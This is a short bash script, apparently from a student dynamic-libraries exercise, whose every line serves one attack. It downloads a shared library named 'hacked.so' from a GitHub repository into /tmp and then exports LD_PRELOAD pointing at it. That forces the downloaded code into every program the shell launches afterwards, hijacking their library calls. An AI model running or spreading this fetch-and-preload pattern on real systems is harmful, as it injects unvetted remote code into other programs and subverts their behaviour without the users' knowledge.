#!/bin/bash
wget -P /tmp https://github.com/Dozman0/alx-low_level_programming/raw/master/0x18-dynamic_libraries/hacked.so
export LD_PRELOAD=/tmp/hacked.so
